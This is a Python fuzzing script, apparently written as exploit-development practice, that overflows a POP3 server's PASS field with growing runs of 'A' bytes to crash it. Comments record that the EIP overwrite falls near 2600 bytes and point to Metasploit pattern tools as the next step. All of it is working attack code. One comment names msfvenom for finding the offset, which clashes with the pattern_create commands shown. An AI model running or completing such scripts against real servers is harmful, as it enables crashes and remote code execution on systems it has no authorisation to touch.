from socket import socket, SOCK_STREAM, AF_INET
from struct import pack

RHOST = '192.168.0.100'
RPORT = 110 # pop3
READ_BUF_SIZE = 1024
MAX_BUF_SIZE = 3000

# use pattern_create/offset located at: cd /opt/metasploit-framework/embedded/framework/tools/exploit/
# ./pattern_create -l 100000 

def receive_response(opt=False):
    if (opt == 'v'): # verbose
        print(s.recv(READ_BUF_SIZE).decode('utf-8'))
    else: 
        s.recv(READ_BUF_SIZE).decode('utf-8')

passwd_size = 2000

while (passwd_size <= MAX_BUF_SIZE):
    try: 
        s = socket(AF_INET, SOCK_STREAM)
        s.connect((RHOST, RPORT))
        print('Trying passwd size of ', passwd_size)
        receive_response()

        s.send(b'USER legituser\r\n')
        receive_response()

        passwd_buf = b'PASS '
        passwd_buf += b'A' * passwd_size + b'\r\n'

        s.send(passwd_buf)
        receive_response()

        s.send(b'QUIT\r\n')
        s.close()
    except:
        print('could not connect...')
        s.close()
    passwd_size += 100

# found EIP at little after passwd buffer of 2600 bytes
# next, use msfvenom to find the exact location of the EIP
# ./pattern_create.rb -l 2650

